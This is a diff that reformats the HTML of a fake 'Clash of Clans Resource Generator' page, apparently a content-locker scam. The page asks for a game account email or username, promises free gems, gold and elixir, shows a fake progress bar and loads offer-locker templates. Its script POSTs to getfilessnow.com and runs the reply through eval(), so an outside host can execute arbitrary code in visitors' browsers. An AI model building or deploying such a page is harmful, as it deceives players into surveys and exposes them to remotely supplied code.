@@ -1,119 +1,20 @@
 
 <!DOCTYPE html>
 <html lang="en" style="height:100%;">
-				<head>
-
-			<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-				<meta name="googlebot" content="noindex">
-				<base href="https://getfilessnow.com/" target="_blank">
-				<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
-								<script type="text/javascript" src="/jquery.tipsy.js"></script>
-													<link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.0.0-rc1/css/bootstrap.min.css">
-					<link rel="stylesheet" href="/bootstrap3/css/bootstrap-glyphicons.css">
-								<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
-				<link rel="icon" href="/favicon.ico" type="image/x-icon">
-					
-					<script language="JavaScript">
-					$(function() {
-												$('.tip_over_link').tipsy({offset: -3,gravity: 'w',fade: false,html: true,opacity: 0.95});
-											});
-					var timed_function;
-					function Start_Ajax(the_url){
-						var protocol = document.location.protocol;
-												window.open(the_url,'_blank');
-						clearTimeout(timed_function);
-						$('#offerlst').hide();
-						$('#offerwait').show();
-												timed_function = setTimeout("chkld();",20000);
-											}
-					function Back_Ajax(){
-						$('#offerwait').hide();
-						$('#offerlst').fadeIn('slow');
-					}
-					function chkld(){
-						$.ajax({
-							type: "POST",
-							crossDomain: true,
-							data: "a_t=0&lid=562215",
-							url: "https://getfilessnow.com/ajax_check_url.php",
-							success: function(msg){
-								eval(msg);
-							}
-						});
-					}
-					function completed(url){
-						top.location = url;
-					}
-									</script>
-								<link href='https://fonts.googleapis.com/css?family=Lato' rel='stylesheet' type='text/css'>
-				<style>
-					/* ===== Tipsy ===== */
 			
-					.tipsy { padding: 4px; font-size: 11px; position: absolute; z-index: 100000; }
-		
-					.tipsy-inner { padding: 5px 7px 5px 8px; background-color: black; color: white; max-width: 300px; text-align: center; }
-					.tipsy-inner { border-radius: 3px; -moz-border-radius:3px; -webkit-border-radius:3px; }
-					.tipsy-arrow { position: absolute; background: url('/images/tipsy.gif') no-repeat top left; width: 9px; height: 5px; }
-					.tipsy-w { margin-left: 5px; }
-					.tipsy-w .tipsy-arrow { top: 50%; margin-top: -4px; left: 0; width: 5px; height: 9px; }
-		
-					body{
-						background-color:white;
-						font-size: 14px;
-					}
-					
-					.offerlst{
-			
-						background-color:rgba(239,239,239,0.5);
-						
-						border:1px solid white;
-						padding:20px;
-						border-radius:8px;
-						
-						min-height: 80px;
-						margin-bottom: 8px;
-						font-size: 16px;
-					}
-					.link_a, .link_a:link{
-						
-						
-						background-color: #F5F5F5;
-					    background-image: linear-gradient(to bottom, #FFFFFF, #E6E6E6);
-					    background-repeat: repeat-x;
-					    border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) #B3B3B3;
-					    border-image: none;
-					    border-radius: 4px 4px 4px 4px;
-					    border-style: solid;
-					    border-width: 1px;
-					    box-shadow: 0 1px 0 rgba(255, 255, 255, 0.2) inset, 0 1px 2px rgba(0, 0, 0, 0.05);
-					    color: #333333;
-					    cursor: pointer;
-					    display: inline-block;
-					    font-size: 14px;
-					    line-height: 20px;
-					    margin-bottom: 0;
-					    padding: 4px 12px;
-					    text-align: center;
-					    text-shadow: 0 1px 1px rgba(255, 255, 255, 0.75);
-					    vertical-align: middle;
-		
-						font-weight: normal;
-						text-decoration:none;
-		
-						
-						
-					}
-					
-					.link_a:hover{
-						background-position: 0 -15px;
-					    transition: background-position 0.1s linear 0s;
-					}
-					.each_p_elm{
-						margin: 3px 0;
-		
-						padding: 3px;
-						white-space:nowrap;
-					}
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta name="googlebot" content="noindex">
+	<base href="https://getfilessnow.com/" target="_blank">
+	<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<script type="text/javascript" src="/jquery.tipsy.js"></script>
+	<link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.0.0-rc1/css/bootstrap.min.css">
+	<link rel="stylesheet" href="/bootstrap3/css/bootstrap-glyphicons.css">
+	<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+	<link rel="icon" href="/favicon.ico" type="image/x-icon">
+	<link href='https://fonts.googleapis.com/css?family=Lato' rel='stylesheet' type='text/css'>
+<style>
+/* ===== Tipsy ===== */
 body {
     background: #000 url(https://newevolutiondesigns.com/images/freebies/hd-wallpaper-48.jpg) no-repeat;
     background-position: 50% 50%;
@@ -125,6 +26,59 @@ body {
     overflow-y: scroll;
     overflow-x: hidden;
     padding: 10px;
+}
+.tipsy { padding: 4px; font-size: 11px; position: absolute; z-index: 100000; }
+
+.tipsy-inner { padding: 5px 7px 5px 8px; background-color: black; color: white; max-width: 300px; text-align: center; }
+
+.tipsy-inner { border-radius: 3px; -moz-border-radius:3px; -webkit-border-radius:3px; }
+
+.tipsy-arrow { position: absolute; background: url('/images/tipsy.gif') no-repeat top left; width: 9px; height: 5px; }
+
+.tipsy-w { margin-left: 5px; }
+
+.tipsy-w .tipsy-arrow { top: 50%; margin-top: -4px; left: 0; width: 5px; height: 9px; }
+				
+.offerlst{
+	background-color:rgba(239,239,239,0.5);
+	border:1px solid white;
+	padding:20px;
+	border-radius:8px;
+	min-height: 80px;
+	margin-bottom: 8px;
+	font-size: 16px;
+}
+.link_a, .link_a:link{
+	background-color: #F5F5F5;
+    background-image: linear-gradient(to bottom, #FFFFFF, #E6E6E6);
+    background-repeat: repeat-x;
+    border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) #B3B3B3;
+    border-image: none;
+    border-radius: 4px 4px 4px 4px;
+    border-style: solid;
+    border-width: 1px;
+    box-shadow: 0 1px 0 rgba(255, 255, 255, 0.2) inset, 0 1px 2px rgba(0, 0, 0, 0.05);
+    color: #333333;
+    cursor: pointer;
+    display: inline-block;
+    font-size: 14px;
+    line-height: 20px;
+    margin-bottom: 0;
+    padding: 4px 12px;
+    text-align: center;
+    text-shadow: 0 1px 1px rgba(255, 255, 255, 0.75);
+    vertical-align: middle;
+	font-weight: normal;
+	text-decoration:none;
+}
+.link_a:hover{
+	background-position: 0 -15px;
+    transition: background-position 0.1s linear 0s;
+}
+.each_p_elm{
+	margin: 3px 0;
+	padding: 3px;
+	white-space:nowrap;
 }
 .content {
     width: 100%;
@@ -433,30 +387,30 @@ p {
 #sub-head2 {
     display: none;
 }
-				</style>
-				<title>Clash of clans Prabal</title>
-			</head>
-			<body id="the_body" style="margin:0; height:100%; font-family: 'Lato', sans-serif;">
-												
-				<!--Begin -->
+</style>
+<title>COC Website</title>
+</head>
+<body id="the_body" style="margin:0; height:100%; font-family: 'Lato', sans-serif;">
+
+<!--Begin -->
 
 <link href='https://fonts.googleapis.com/css?family=Oswald' rel='stylesheet' type='text/css'>
 
 <div id="user-process">
-    <div id="user-box">
-        <div class="loader">Loading...</div>
-        <br>
-        <center>
-            <h2 id="user-connect-text"></h2>
-        </center>
-        <br>
-        <div class="col-xs-12 col-sm-12 progress-container">
-            <div class="progress progress-striped active">
-                <div class="progress-bar progress-bar-success" style="width:0%"></div>
-            </div>
-        </div>
-        <br>
-    </div>
+	<div id="user-box">
+		<div class="loader">Loading...</div>
+			<br>
+			<center>
+				<h2 id="user-connect-text"></h2>
+			</center>
+			<br>
+		<div class="col-xs-12 col-sm-12 progress-container">
+			<div class="progress progress-striped active">
+				<div class="progress-bar progress-bar-success" style="width:0%"></div>
+			</div>
+		</div>
+		<br>
+	</div>
 </div>
 
 <div id="locker">
@@ -482,97 +436,118 @@ p {
 
 <div id="super-generator">
     <div class="content"></div>
-    <center><img id="banner" src="http://s08.imgs.to/share/image/CX0be1BpUD_a.png">
-    </center>
-    <br>
+    	<center><img id="banner" src="http://s08.imgs.to/share/image/CX0be1BpUD_a.png">
+    	</center>
+    	<br>
+    	<div id="content-wrapper">
+        	<div id="head">
+            	<center>
+                	<h1 style="font-family: 'Oswald', sans-serif;">Clash of Clans Resource Generator</h1>
+                	<p id="sub-head2">Choose your desired amount to generate.</p>
+            	</center>
+        	</div>
+        	<div id="content">
+            	<div id="user">
+                	<center>
+                    	<div style="margin:0px auto;max-width:500px;">
+                        	<h2><i class="glyphicon glyphicon-envelope"></i>Enter Boom Beach Account</h2>
+                        	<input id="userId" type="text" maxlength='50' class="form-control" placeholder="Email/Username" />
+                        	<br>
+                        	<h2><i class="glyphicon glyphicon-hdd"></i>Select Your Platform</h2>
+                        	<select id="deviceInput" class="form-control">
+                            	<option value="Android">Android</option>
+                            	<option value="iOS">iOS</option>
+                        	</select>
+                        	<br>
+                    	</div>
+                    	<button id="user-connect">Connect</button>
+                    	<br>
+                	</center>
+            	</div>
 
-    <div id="content-wrapper">
-        <div id="head">
-            <center>
-                <h1 style="font-family: 'Oswald', sans-serif;">Clash of Clans Resource Generator</h1>
-                <p id="sub-head2">Choose your desired amount to generate.</p>
-            </center>
-        </div>
-        <div id="content">
+            	<div id="items">
+                	<center>
+                    	<div style="margin:0px auto;max-width:500px;">
+                        	<h2><i class="glyphicon glyphicon-sort-by-attributes-alt"></i>Select Gems amount</h2>
+                        	<select id="item1" class="form-control resource" style="background: url(http://s08.imgs.to/share/image/s57fttEm3s_gems.png) no-repeat scroll 5px 7px;">
+                            	<option value="1,000">1,000</option>
+                            	<option value="3,000">3,000</option>
+                            	<option value="5,000">5,000</option>
+                            	<option value="7,000">7,000</option>
+                            	<option value="10,000">10,000</option>
+                        	</select>
+                        	<br>
+                        	<h2><i class="glyphicon glyphicon-sort-by-attributes-alt"></i>Select Elixir amount</h2>
+                        	<select id="item1" class="form-control resource" style="background: url(http://s08.imgs.to/share/image/j28VqYQOGQ_elixir.png) no-repeat scroll 5px 7px;">
+                            	<option value="100,000">100,000</option>
+                            	<option value="300,000">300,000</option>
+                            	<option value="500,000">500,000</option>
+                            	<option value="700,000">700,000</option>
+                            	<option value="1,000,000">1,000,000</option>
+                        	</select>
+                        	<br>
+							<h2><i class="glyphicon glyphicon-sort-by-attributes-alt"></i>Select Gold amount</h2>
+                        	<select id="item1" class="form-control resource" style="background: url(http://s08.imgs.to/share/image/N2TuQkXIms_gold.png) no-repeat scroll 5px 7px;">
+                            	<option value="100,000">100,000</option>
+                            	<option value="300,000">300,000</option>
+                            	<option value="500,000">500,000</option>
+                            	<option value="700,000">700,000</option>
+                            	<option value="1,000,000">1,000,000</option>
+                        	</select>
+                        	<br>
+                    	</div>
+                    	<button id="user-generate"><i class="glyphicon glyphicon-cog"></i>Generate</button>
+                    	<br>
+                	</center>
+            	</div>
 
-            <div id="user">
-                <center>
-                    <div style="margin:0px auto;max-width:500px;">
-                        <h2><i class="glyphicon glyphicon-envelope"></i>Enter Boom Beach Account</h2>
-                        <input id="userId" type="text" maxlength='50' class="form-control" placeholder="Email/Username" />
-                        <br>
-                        <h2><i class="glyphicon glyphicon-hdd"></i>Select Your Platform</h2>
-                        <select id="deviceInput" class="form-control">
-                            <option value="Android">Android</option>
-                            <option value="iOS">iOS</option>
-                        </select>
-                        <br>
-                    </div>
-                    <button id="user-connect">Connect</button>
-                    <br>
-                </center>
-            </div>
+            	<div id="generate">
+                	<div class="loader">Loading...</div>
+                	<center><b><p id="msg"></p></b>
+                	</center>
+                	<br/>
+                	<div id="process"></div>
+            	</div>
+        	</div>
+    	</div>
+    	<center>
+        	<br>
+        	<p style="color:#fff">Copyright 2016 @ All rights reserved.</p>
+    	</center>
+	</div>
 
-            <div id="items">
-                <center>
-                    <div style="margin:0px auto;max-width:500px;">
-
-                        <h2><i class="glyphicon glyphicon-sort-by-attributes-alt"></i>Select Gems amount</h2>
-                        <select id="item1" class="form-control resource" style="background: url(http://s08.imgs.to/share/image/s57fttEm3s_gems.png) no-repeat scroll 5px 7px;">
-                            <option value="1,000">1,000</option>
-                            <option value="3,000">3,000</option>
-                            <option value="5,000">5,000</option>
-                            <option value="7,000">7,000</option>
-                            <option value="10,000">10,000</option>
-                        </select>
-                        <br>
-
-
-                        <h2><i class="glyphicon glyphicon-sort-by-attributes-alt"></i>Select Elixir amount</h2>
-                        <select id="item1" class="form-control resource" style="background: url(http://s08.imgs.to/share/image/j28VqYQOGQ_elixir.png) no-repeat scroll 5px 7px;">
-                            <option value="100,000">100,000</option>
-                            <option value="300,000">300,000</option>
-                            <option value="500,000">500,000</option>
-                            <option value="700,000">700,000</option>
-                            <option value="1,000,000">1,000,000</option>
-                        </select>
-                        <br>
-
-                        <h2><i class="glyphicon glyphicon-sort-by-attributes-alt"></i>Select Gold amount</h2>
-                        <select id="item1" class="form-control resource" style="background: url(http://s08.imgs.to/share/image/N2TuQkXIms_gold.png) no-repeat scroll 5px 7px;">
-                            <option value="100,000">100,000</option>
-                            <option value="300,000">300,000</option>
-                            <option value="500,000">500,000</option>
-                            <option value="700,000">700,000</option>
-                            <option value="1,000,000">1,000,000</option>
-                        </select>
-                        <br>
-
-
-                    </div>
-                    <button id="user-generate"><i class="glyphicon glyphicon-cog"></i>Generate</button>
-                    <br>
-                </center>
-            </div>
-
-            <div id="generate">
-                <div class="loader">Loading...</div>
-                <center><b><p id="msg"></p></b>
-                </center>
-                <br/>
-                <div id="process"></div>
-            </div>
-
-        </div>
-    </div>
-
-    <center>
-        <br>
-        <p style="color:#fff">Copyright 2016 @ All rights reserved.</p>
-    </center>
-
-</div>
 <script>
+	$(function() {
+		$('.tip_over_link').tipsy({offset: -3,gravity: 'w',fade: false,html: true,opacity: 0.95});
+	});
+	var timed_function;
+	function Start_Ajax(the_url){
+		var protocol = document.location.protocol;
+		window.open(the_url,'_blank');
+		clearTimeout(timed_function);
+		$('#offerlst').hide();
+		$('#offerwait').show();
+		timed_function = setTimeout("chkld();",20000);
+	}
+	function Back_Ajax(){
+		$('#offerwait').hide();
+		$('#offerlst').fadeIn('slow');
+	}
+	function chkld(){
+		$.ajax({
+			type: "POST",
+			crossDomain: true,
+			data: "a_t=0&lid=562215",
+			url: "https://getfilessnow.com/ajax_check_url.php",
+			success: function(msg){
+				eval(msg);
+			}
+		});
+	}
+	function completed(url){
+		top.location = url;
+	}
+
     $('#super-generator').hide(0).delay(1000).fadeIn();
 
     $('#verify').click(function() {
@@ -806,6 +781,9 @@ p {
     $('head').append('<meta name="viewport" content="width=device-width, initial-scale=1 maximum-scale=1"></meta>');
 </script>
 
-     <div class="important"></div>
+<div class="important"></div>
 
 <script src='http://cpagriptemplates.com/jquery-1.12.0.min.js'></script>
+
+</body>
+</html>
